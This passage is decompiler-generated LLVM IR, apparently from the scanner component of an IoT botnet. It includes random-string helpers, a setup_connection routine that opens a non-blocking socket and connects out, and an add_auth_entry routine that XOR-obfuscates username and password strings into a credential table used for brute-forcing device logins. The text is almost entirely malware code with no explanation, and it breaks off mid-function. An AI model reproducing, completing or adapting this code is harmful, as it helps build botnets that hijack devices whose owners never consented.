define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_df60 = call i32 @__GI_time(i32* null)
  store i32 %v2_df60, i32* @global_var_218c8.117, align 4
  %v1_df6c = call i32 @__getpid(i32 %v2_df60)
  store i32 %v1_df6c, i32* @r0, align 4
  %v0_df74 = call i32 @getppid()
  %v2_df7c = xor i32 %v1_df6c, %v0_df74
  store i32 %v2_df7c, i32* @global_var_218cc.121, align 4
  %v1_df84 = call i32 @clock(i32 %v2_df7c)
  %v2_df88 = load i32, i32* @global_var_218cc.121, align 4
  %v2_df94 = xor i32 %v2_df88, %v1_df84
  store i32 %v2_df94, i32* @global_var_218d4.119, align 4
  store i32 %v1_df84, i32* @global_var_218d0.123, align 4
  ret i32 %v1_df84

; uselistorder directives
  uselistorder i32 %v1_df84, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_dfbc = load i32, i32* @r4, align 4
  %v6_dfbc = load i32, i32* @r5, align 4
  %v9_dfbc = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_dfd0 = call i32 @table_unlock_val(i32 28)
  %v3_dfdc = call i32 @table_retrieve_val(i32 28, i32* null)
  store i32 %v3_dfdc, i32* @r1, align 4
  %v2_dfe8 = bitcast i32* %stack_var_-72 to i8*
  %v3_dfe8 = call i32 @strcpy(i8* %v2_dfe8, i32 %v3_dfdc)
  %v2_dfec = icmp eq i32 %arg2, 0
  br i1 %v2_dfec, label %dec_label_pc_e068, label %dec_label_pc_dff4

dec_label_pc_dff4:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_218c8.117 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218cc.121 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218d0.123 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218d4.119 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e04c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e008

dec_label_pc_e008:                                ; preds = %dec_label_pc_e008.dec_label_pc_e008_crit_edge, %dec_label_pc_dff4
  %v1_e02c = phi i32 [ %v1_e02c.pre, %dec_label_pc_e008.dec_label_pc_e008_crit_edge ], [ ptrtoint (i32* @global_var_218c8.117 to i32), %dec_label_pc_dff4 ]
  %v2_e008 = load i32, i32* @global_var_218d4.119, align 4
  store i32 %v2_e008, i32* %r2.global-to-local, align 4
  %v2_e00c = load i32, i32* @global_var_218c8.117, align 4
  %v4_e010 = udiv i32 %v2_e008, 524288
  %v5_e010 = xor i32 %v4_e010, %v2_e008
  %v4_e014 = mul i32 %v2_e00c, 2048
  %v5_e014 = xor i32 %v4_e014, %v2_e00c
  %v2_e018 = xor i32 %v5_e010, %v5_e014
  %v2_e01c = load i32, i32* @global_var_218cc.121, align 4
  %v2_e020 = load i32, i32* @global_var_218d0.123, align 4
  store i32 %v2_e020, i32* %ip.global-to-local, align 4
  %v4_e024 = udiv i32 %v5_e014, 256
  %v5_e024 = xor i32 %v2_e018, %v4_e024
  store i32 %v5_e024, i32* @r4, align 4
  %v2_e02c = inttoptr i32 %v1_e02c to i32*
  store i32 %v2_e01c, i32* %v2_e02c, align 4
  %v0_e030 = load i32, i32* %ip.global-to-local, align 4
  %v1_e030 = load i32, i32* %r8.global-to-local, align 4
  %v2_e030 = inttoptr i32 %v1_e030 to i32*
  store i32 %v0_e030, i32* %v2_e030, align 4
  %v0_e034 = load i32, i32* %r2.global-to-local, align 4
  %v1_e034 = load i32, i32* %r7.global-to-local, align 4
  %v2_e034 = inttoptr i32 %v1_e034 to i32*
  store i32 %v0_e034, i32* %v2_e034, align 4
  %v0_e038 = load i32, i32* @r4, align 4
  %v1_e038 = load i32, i32* @r6, align 4
  %v2_e038 = inttoptr i32 %v1_e038 to i32*
  store i32 %v0_e038, i32* %v2_e038, align 4
  %v2_e03c = call i32 @util_strlen(i8* %v2_dfe8)
  %v0_e044 = load i32, i32* @r4, align 4
  %v3_e048 = urem i32 %v0_e044, %v2_e03c
  %v2_e050 = add i32 %v3_e048, %v2_e04c
  %v1_e054 = add i32 %v2_e050, -32
  %v2_e054 = inttoptr i32 %v1_e054 to i8*
  %v3_e054 = load i8, i8* %v2_e054, align 1
  %v2_e058 = load i32, i32* @r5, align 4
  %v3_e058 = load i32, i32* %fp.global-to-local, align 4
  %v4_e058 = add i32 %v3_e058, %v2_e058
  %v5_e058 = inttoptr i32 %v4_e058 to i8*
  store i8 %v3_e054, i8* %v5_e058, align 1
  %v0_e05c = load i32, i32* @r5, align 4
  %v1_e05c = add i32 %v0_e05c, 1
  store i32 %v1_e05c, i32* @r5, align 4
  %v1_e060 = load i32, i32* %sb.global-to-local, align 4
  %v9_e060 = icmp eq i32 %v1_e05c, %v1_e060
  br i1 %v9_e060, label %dec_label_pc_e068, label %dec_label_pc_e008.dec_label_pc_e008_crit_edge

dec_label_pc_e008.dec_label_pc_e008_crit_edge:    ; preds = %dec_label_pc_e008
  %v1_e02c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e008

dec_label_pc_e068:                                ; preds = %dec_label_pc_e008, %entry
  %v1_e06c = call i32 @table_lock_val(i32 28)
  store i32 %v3_dfbc, i32* @r4, align 4
  store i32 %v6_dfbc, i32* @r5, align 4
  store i32 %v9_dfbc, i32* @r6, align 4
  ret i32 %v1_e06c

; uselistorder directives
  uselistorder i32 %v2_e00c, { 1, 0 }
  uselistorder i32 %v2_e008, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e08c = load i32, i32* %r1.global-to-local, align 4
  %v3_e090 = load i32, i32* @r4, align 4
  store i32 %v3_e090, i32* %stack_var_-28, align 4
  %v0_e094 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e094, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e08c, 1
  br i1 %tmp16, label %dec_label_pc_e13c, label %dec_label_pc_e09c

dec_label_pc_e09c:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_218d4.119 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218d0.123 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218cc.121 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218c8.117 to i32), i32* %r6.global-to-local, align 4
  %v2_e0ac = load i32, i32* @global_var_218d4.119, align 4
  store i32 %v2_e0ac, i32* %lr.global-to-local, align 4
  %v2_e0b0 = load i32, i32* @global_var_218d0.123, align 4
  store i32 %v2_e0b0, i32* %r4.global-to-local, align 4
  %v2_e0b4 = load i32, i32* @global_var_218cc.121, align 4
  store i32 %v2_e0b4, i32* %r0.global-to-local, align 4
  %v2_e0b8 = load i32, i32* @global_var_218c8.117, align 4
  br label %dec_label_pc_e0dc

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e0fc
  %v1_e0c0 = trunc i32 %v5_e0ec to i16
  %v3_e0c0 = inttoptr i32 %v9_e0f0 to i16*
  store i16 %v1_e0c0, i16* %v3_e0c0, align 2
  %v4_e0c0 = load i32, i32* %r5.global-to-local, align 4
  %v5_e0c0 = add i32 %v4_e0c0, -2
  store i32 %v5_e0c0, i32* %r5.global-to-local, align 4
  %v0_e0c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %.thread, %dec_label_pc_e0c0
  %v0_e0c4 = phi i32 [ %v9_e0f4, %.thread ], [ %v0_e0c4.pre, %dec_label_pc_e0c0 ]
  %v2_e0c05 = phi i32 [ %v12_e0f0, %.thread ], [ %v5_e0c0, %dec_label_pc_e0c0 ]
  %tmp17 = icmp slt i32 %v0_e0c4, 1
  br i1 %tmp17, label %dec_label_pc_e144, label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4
  %v0_e0c8 = load i32, i32* %r0.global-to-local, align 4
  %v0_e0d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e0d0, i32* %r0.global-to-local, align 4
  %v0_e0d4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e0d4, i32* %r4.global-to-local, align 4
  %v0_e0d8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e0d8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e0dc

dec_label_pc_e0dc:                                ; preds = %dec_label_pc_e09c, %dec_label_pc_e0d0
  %v0_e128 = phi i32 [ %v2_e0b4, %dec_label_pc_e09c ], [ %v0_e0d0, %dec_label_pc_e0d0 ]
  %v9_e0f0 = phi i32 [ %v0_e094, %dec_label_pc_e09c ], [ %v2_e0c05, %dec_label_pc_e0d0 ]
  %v0_e108 = phi i32 [ %v0_e08c, %dec_label_pc_e09c ], [ %v0_e0c4, %dec_label_pc_e0d0 ]
  %v0_e11c = phi i32 [ %v2_e0ac, %dec_label_pc_e09c ], [ %v0_e0d8, %dec_label_pc_e0d0 ]
  %v0_e118 = phi i32 [ %v2_e0b8, %dec_label_pc_e09c ], [ %v0_e0c8, %dec_label_pc_e0d0 ]
  %v4_e0dc = mul i32 %v0_e118, 2048
  %v5_e0dc = xor i32 %v4_e0dc, %v0_e118
  %v4_e0e0 = udiv i32 %v0_e11c, 524288
  %v5_e0e0 = xor i32 %v4_e0e0, %v0_e11c
  %v2_e0e4 = xor i32 %v5_e0e0, %v5_e0dc
  %v4_e0ec = udiv i32 %v5_e0dc, 256
  %v5_e0ec = xor i32 %v2_e0e4, %v4_e0ec
  store i32 %v5_e0ec, i32* %r3.global-to-local, align 4
  %v7_e0f0 = icmp sgt i32 %v0_e108, 3
  br i1 %v7_e0f0, label %.thread, label %dec_label_pc_e0fc

.thread:                                          ; preds = %dec_label_pc_e0dc
  %v10_e0f0 = inttoptr i32 %v9_e0f0 to i32*
  store i32 %v5_e0ec, i32* %v10_e0f0, align 4
  %v11_e0f0 = load i32, i32* %r5.global-to-local, align 4
  %v12_e0f0 = add i32 %v11_e0f0, 4
  store i32 %v12_e0f0, i32* %r5.global-to-local, align 4
  %v8_e0f4 = load i32, i32* %r1.global-to-local, align 4
  %v9_e0f4 = add i32 %v8_e0f4, -4
  store i32 %v9_e0f4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e0c4

dec_label_pc_e0fc:                                ; preds = %dec_label_pc_e0dc
  %v7_e108 = icmp eq i32 %v0_e108, 1
  store i32 %v5_e0ec, i32* %r3.global-to-local, align 4
  %v1_e110 = add i32 %v0_e108, -2
  store i32 %v1_e110, i32* %r1.global-to-local, align 4
  br i1 %v7_e108, label %dec_label_pc_e118, label %dec_label_pc_e0c0

dec_label_pc_e118:                                ; preds = %dec_label_pc_e0fc
  store i32 %v5_e0ec, i32* %r3.global-to-local, align 4
  %v1_e128 = load i32, i32* %r6.global-to-local, align 4
  %v2_e128 = inttoptr i32 %v1_e128 to i32*
  store i32 %v0_e128, i32* %v2_e128, align 4
  %v0_e12c = load i32, i32* %r4.global-to-local, align 4
  %v1_e12c = load i32, i32* %r7.global-to-local, align 4
  %v2_e12c = inttoptr i32 %v1_e12c to i32*
  store i32 %v0_e12c, i32* %v2_e12c, align 4
  %v0_e130 = load i32, i32* %lr.global-to-local, align 4
  %v1_e130 = load i32, i32* %r8.global-to-local, align 4
  %v2_e130 = inttoptr i32 %v1_e130 to i32*
  store i32 %v0_e130, i32* %v2_e130, align 4
  %v0_e134 = load i32, i32* %r3.global-to-local, align 4
  %v1_e134 = load i32, i32* %sl.global-to-local, align 4
  %v2_e134 = inttoptr i32 %v1_e134 to i32*
  store i32 %v0_e134, i32* %v2_e134, align 4
  %v0_e138 = load i32, i32* %r3.global-to-local, align 4
  %v1_e138 = trunc i32 %v0_e138 to i8
  %v2_e138 = load i32, i32* %r5.global-to-local, align 4
  %v3_e138 = inttoptr i32 %v2_e138 to i8*
  store i8 %v1_e138, i8* %v3_e138, align 1
  br label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %entry, %dec_label_pc_e144, %dec_label_pc_e118
  %v2_e13c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e13c, i32* @r4, align 4
  %v1_e140 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e140

dec_label_pc_e144:                                ; preds = %dec_label_pc_e0c4
  %v0_e144 = load i32, i32* %r3.global-to-local, align 4
  %v1_e144 = load i32, i32* %sl.global-to-local, align 4
  %v2_e144 = inttoptr i32 %v1_e144 to i32*
  store i32 %v0_e144, i32* %v2_e144, align 4
  %v0_e148 = load i32, i32* %lr.global-to-local, align 4
  %v1_e148 = load i32, i32* %r8.global-to-local, align 4
  %v2_e148 = inttoptr i32 %v1_e148 to i32*
  store i32 %v0_e148, i32* %v2_e148, align 4
  %v0_e14c = load i32, i32* %r4.global-to-local, align 4
  %v1_e14c = load i32, i32* %r7.global-to-local, align 4
  %v2_e14c = inttoptr i32 %v1_e14c to i32*
  store i32 %v0_e14c, i32* %v2_e14c, align 4
  %v0_e150 = load i32, i32* %r0.global-to-local, align 4
  %v1_e150 = load i32, i32* %r6.global-to-local, align 4
  %v2_e150 = inttoptr i32 %v1_e150 to i32*
  store i32 %v0_e150, i32* %v2_e150, align 4
  br label %dec_label_pc_e13c

; uselistorder directives
  uselistorder i32 %v9_e0f4, { 1, 0 }
  uselistorder i32 %v12_e0f0, { 1, 0 }
  uselistorder i32 %v5_e0ec, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e118, { 1, 0 }
  uselistorder i32 %v0_e11c, { 1, 0 }
  uselistorder i32 %v0_e108, { 1, 0, 2 }
  uselistorder i32 %v0_e0c4, { 1, 0 }
  uselistorder i32 %v0_e08c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_218c8.117, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_218c8.117 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_218cc.121, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_218d0.123, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_218d4.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e13c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e0dc, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e168 = load i32, i32* @r4, align 4
  store i32 %v3_e168, i32* %stack_var_-16, align 4
  %v6_e168 = load i32, i32* @r5, align 4
  %v9_e168 = load i32, i32* @r6, align 4
  %v12_e168 = load i32, i32* @lr, align 4
  %v0_e16c = load i32, i32* @r0, align 4
  store i32 %v0_e16c, i32* @r5, align 4
  %v1_e170 = add i32 %v0_e16c, 4
  %v2_e170 = inttoptr i32 %v1_e170 to i32*
  %v3_e170 = load i32, i32* %v2_e170, align 4
  store i32 %v3_e170, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 57748, i32* @lr, align 4
  %v1_e190 = icmp ne i32 %v3_e170, -1
  call void @__pseudo_cond_branch(i1 %v1_e190, i32 ptrtoint (i32* @global_var_13f30.111 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e19c = load i32, i32* @r6, align 4
  store i32 %v0_e19c, i32* %r2.global-to-local, align 4
  %v3_e1a0 = call i32 @socket(i32 2, i32 1, i32 %v0_e19c)
  store i32 %v3_e1a0, i32* %r0.global-to-local, align 4
  %v7_e1a4 = icmp eq i32 %v3_e1a0, -1
  %v1_e1a8 = load i32, i32* @r5, align 4
  %v2_e1a8 = add i32 %v1_e1a8, 4
  %v3_e1a8 = inttoptr i32 %v2_e1a8 to i32*
  store i32 %v3_e1a0, i32* %v3_e1a8, align 4
  br i1 %v7_e1a4, label %entry.dec_label_pc_e220_crit_edge, label %dec_label_pc_e1b0

entry.dec_label_pc_e220_crit_edge:                ; preds = %entry
  %v1_e228.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e220

dec_label_pc_e1b0:                                ; preds = %entry
  %v2_e174 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e1b0 = load i32, i32* @r5, align 4
  %v1_e1b0 = add i32 %v0_e1b0, 28
  store i32 %v1_e1b0, i32* @r0, align 4
  %v0_e1b4 = load i32, i32* @r6, align 4
  %v2_e1b4 = add i32 %v0_e1b0, 24
  %v3_e1b4 = inttoptr i32 %v2_e1b4 to i32*
  store i32 %v0_e1b4, i32* %v3_e1b4, align 4
  store i32 256, i32* @r1, align 4
  %v0_e1bc = call i32 @util_zero()
  store i32 %v0_e1bc, i32* %r0.global-to-local, align 4
  %v0_e1c0 = load i32, i32* @r5, align 4
  %v1_e1c0 = add i32 %v0_e1c0, 4
  %v2_e1c0 = inttoptr i32 %v1_e1c0 to i32*
  %v3_e1c0 = load i32, i32* %v2_e1c0, align 4
  store i32 %v3_e1c0, i32* @r4, align 4
  %v0_e1c4 = load i32, i32* @r6, align 4
  store i32 %v0_e1c4, i32* @r2, align 4
  store i32 %v3_e1c0, i32* %r0.global-to-local, align 4
  %v2_e1d0 = call i32 @__libc_fcntl(i32 %v3_e1c0, i32 3)
  %v1_e1d8 = or i32 %v2_e1d0, 2048
  store i32 %v1_e1d8, i32* @r2, align 4
  %v0_e1dc = load i32, i32* @r4, align 4
  store i32 %v0_e1dc, i32* %r0.global-to-local, align 4
  %v2_e1e0 = call i32 @__libc_fcntl(i32 %v0_e1dc, i32 4)
  store i32 %v2_e1e0, i32* %r0.global-to-local, align 4
  %v2_e1e8 = load i32, i32* @global_var_2190c.137, align 4
  store i32 %v2_e1e8, i32* %r2.global-to-local, align 4
  %v1_e1f0 = load i32, i32* @r5, align 4
  %v2_e1f0 = add i32 %v1_e1f0, 12
  %v3_e1f0 = inttoptr i32 %v2_e1f0 to i32*
  store i32 1, i32* %v3_e1f0, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e1fc = load i32, i32* %r2.global-to-local, align 4
  %v1_e1fc = load i32, i32* @r5, align 4
  %v2_e1fc = add i32 %v1_e1fc, 8
  %v3_e1fc = inttoptr i32 %v2_e1fc to i32*
  store i32 %v0_e1fc, i32* %v3_e1fc, align 4
  %v0_e200 = load i32, i32* @r5, align 4
  %v1_e204 = add i32 %v0_e200, 4
  %v2_e204 = inttoptr i32 %v1_e204 to i32*
  %v3_e204 = load i32, i32* %v2_e204, align 4
  store i32 %v3_e204, i32* %r0.global-to-local, align 4
  %v1_e208 = add i32 %v0_e200, 20
  %v2_e208 = inttoptr i32 %v1_e208 to i16*
  %v3_e208 = load i16, i16* %v2_e208, align 2
  %v4_e208 = zext i16 %v3_e208 to i32
  store i32 %v4_e208, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e21c = call i32 @__libc_connect(i32 %v3_e204, i32 %v2_e174, i32 16)
  store i32 %v3_e21c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e220

dec_label_pc_e220:                                ; preds = %entry.dec_label_pc_e220_crit_edge, %dec_label_pc_e1b0
  %v1_e228 = phi i32 [ %v1_e228.pre, %entry.dec_label_pc_e220_crit_edge ], [ %v3_e21c, %dec_label_pc_e1b0 ]
  %v2_e224 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e224, i32* @r4, align 4
  store i32 %v6_e168, i32* @r5, align 4
  store i32 %v9_e168, i32* @r6, align 4
  store i32 %v12_e168, i32* @lr, align 4
  ret i32 %v1_e228

; uselistorder directives
  uselistorder i32 %v3_e1a0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_e220, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e230 = load i32, i32* @r4, align 4
  %v6_e230 = load i32, i32* @r5, align 4
  %v9_e230 = load i32, i32* @r6, align 4
  %v12_e230 = load i32, i32* @r7, align 4
  %v15_e230 = load i32, i32* @r8, align 4
  %v18_e230 = load i32, i32* @sb, align 4
  %v21_e230 = load i32, i32* @sl, align 4
  %v24_e230 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_218d8.139 to i32), i32* @fp, align 4
  %v2_e238 = load i32, i32* @global_var_218d8.139, align 4
  store i32 ptrtoint (i32* @global_var_21904.141 to i32), i32* @sl, align 4
  %v1_e244 = add i32 %v2_e238, 1
  store i32 %v1_e244, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e250 = load i32, i32* @global_var_21904.141, align 4
  store i32 %v2_e250, i32* %r0.global-to-local, align 4
  %v3_e254 = mul i32 %v1_e244, 16
  store i32 %v3_e254, i32* %r1.global-to-local, align 4
  %v4_e25c = inttoptr i32 %v2_e250 to i32*
  %v5_e25c = call i32 @realloc(i32* %v4_e25c, i32 %v3_e254, i32 %arg3, i32 %v1_e244)
  %v2_e260 = load i32, i32* @global_var_218d8.139, align 4
  store i32 %v2_e260, i32* %r2.global-to-local, align 4
  store i32 %v5_e25c, i32* @r8, align 4
  %v0_e268 = load i32, i32* @r5, align 4
  store i32 %v0_e268, i32* %r0.global-to-local, align 4
  %v1_e270 = load i32, i32* @sl, align 4
  %v2_e270 = inttoptr i32 %v1_e270 to i32*
  store i32 %v5_e25c, i32* %v2_e270, align 4
  %v1_e274 = inttoptr i32 %v0_e268 to i8*
  %v2_e274 = call i32 @util_strlen(i8* %v1_e274)
  %sext = mul i32 %v2_e274, 16777216
  %v1_e278 = sdiv i32 %sext, 16777216
  %v2_e278 = add nsw i32 %v1_e278, 1
  store i32 %v2_e278, i32* @r4, align 4
  store i32 %v1_e278, i32* @r7, align 4
  store i32 %v2_e278, i32* @r0, align 4
  %v0_e284 = call i32 @malloc()
  store i32 %v0_e284, i32* %r0.global-to-local, align 4
  %v0_e288 = load i32, i32* @r5, align 4
  store i32 %v0_e288, i32* %r1.global-to-local, align 4
  %v0_e28c = load i32, i32* @r4, align 4
  store i32 %v0_e28c, i32* %r2.global-to-local, align 4
  store i32 %v0_e284, i32* %r6.global-to-local, align 4
  %v3_e294 = call i32 @util_memcpy(i32 %v0_e284, i32 %v0_e288, i32 %v0_e28c)
  store i32 %v3_e294, i32* %r0.global-to-local, align 4
  %v0_e298 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e298, 1
  %extract.t6 = trunc i32 %v0_e298 to i8
  br i1 %tmp22, label %dec_label_pc_e2bc, label %dec_label_pc_e2a0

dec_label_pc_e2a0:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e2a4

dec_label_pc_e2a4:                                ; preds = %dec_label_pc_e2a4, %dec_label_pc_e2a0
  %v2_e2ac = phi i32 [ %v1_e2b0, %dec_label_pc_e2a4 ], [ 0, %dec_label_pc_e2a0 ]
  %v1_e2a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2a4 = add i32 %v1_e2a4, %v2_e2ac
  %v3_e2a4 = inttoptr i32 %v2_e2a4 to i8*
  %v4_e2a4 = load i8, i8* %v3_e2a4, align 1
  %v6_e2a4 = zext i8 %v4_e2a4 to i32
  %v1_e2a8 = xor i32 %v6_e2a4, 84
  store i32 %v1_e2a8, i32* %r3.global-to-local, align 4
  %v1_e2ac = trunc i32 %v1_e2a8 to i8
  store i8 %v1_e2ac, i8* %v3_e2a4, align 1
  %v0_e2b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2b0 = add i32 %v0_e2b0, 1
  store i32 %v1_e2b0, i32* %r2.global-to-local, align 4
  %v1_e2b4 = load i32, i32* @r7, align 4
  %v9_e2b4 = icmp eq i32 %v1_e2b0, %v1_e2b4
  br i1 %v9_e2b4, label %dec_label_pc_e2bc.loopexit, label %dec_label_pc_e2a4

dec_label_pc_e2bc.loopexit:                       ; preds = %dec_label_pc_e2a4
  %extract.t = trunc i32 %v1_e2b0 to i8
  br label %dec_label_pc_e2bc

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e2bc.loopexit, %entry
  %v0_e2cc.off0 = phi i8 [ %extract.t, %dec_label_pc_e2bc.loopexit ], [ %extract.t6, %entry ]
  %v2_e2bc = load i32, i32* @global_var_218d8.139, align 4
  %v2_e2c0 = load i32, i32* @global_var_21904.141, align 4
  %v3_e2c4 = mul i32 %v2_e2bc, 16
  store i32 %v3_e2c4, i32* @sb, align 4
  %v2_e2c8 = add i32 %v2_e2c0, %v3_e2c4
  store i32 %v2_e2c8, i32* %r2.global-to-local, align 4
  %v3_e2cc = add i32 %v2_e2c8, 12
  %v4_e2cc = inttoptr i32 %v3_e2cc to i8*
  store i8 %v0_e2cc.off0, i8* %v4_e2cc, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e260, i32* %r3.global-to-local, align 4
  %v0_e2d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_e2d8 = load i32, i32* @r8, align 4
  %v5_e2d8 = mul i32 %v2_e260, 16
  %v6_e2d8 = add i32 %v1_e2d8, %v5_e2d8
  %v7_e2d8 = inttoptr i32 %v6_e2d8 to i32*
  store i32 %v0_e2d8, i32* %v7_e2d8, align 4
  %v2_e2dc = load i32, i32* @global_var_21904.141, align 4
  store i32 %v2_e2dc, i32* @r7, align 4
  %v1_e2e0 = inttoptr i32 %arg2 to i8*
  %v2_e2e0 = call i32 @util_strlen(i8* %v1_e2e0)
  %sext1 = mul i32 %v2_e2e0, 16777216
  %v1_e2e4 = sdiv i32 %sext1, 16777216
  %v2_e2e4 = add nsw i32 %v1_e2e4, 1
  store i32 %v2_e2e4, i32* @r4, align 4
  store i32 %v1_e2e4, i32* @r6, align 4
  store i32 %v2_e2e4, i32* @r0, align 4
  %v0_e2f0 = call i32 @malloc()
  store i32 %v0_e2f0, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e2f8 = load i32, i32* @r4, align 4
  store i32 %v0_e2f8, i32* %r2.global-to-local, align 4
  store i32 %v0_e2f0, i32* %r5.global-to-local, align 4
  %v3_e300 = call i32 @util_memcpy(i32 %v0_e2f0, i32 %arg2, i32 %v0_e2f8)
  store i32 %v3_e300, i32* %r0.global-to-local, align 4
  %v0_e304 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e304, 1
  %extract.t8 = trunc i32 %v0_e304 to i8
  br i1 %tmp23, label %dec_label_pc_e328, label %dec_label_pc_e30c

dec_label_pc_e30c:                                ; preds = %dec_label_pc_e2bc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e310

dec_label_pc_e310:                                ; preds = %dec_label_pc_e310, %dec_label_pc_e30c
  %v2_e318 = phi i32 [ %v1_e31c, %dec_label_pc_e310 ], [ 0, %dec_label_pc_e30c ]
  %v1_e310 = load i32, i32* %r5.global-to-local, align 4
  %v2_e310 = add i32 %v1_e310, %v2_e318
  %v3_e310 = inttoptr i32 %v2_e310 to i8*
  %v4_e310 = load i8, i8* %v3_e310, align 1
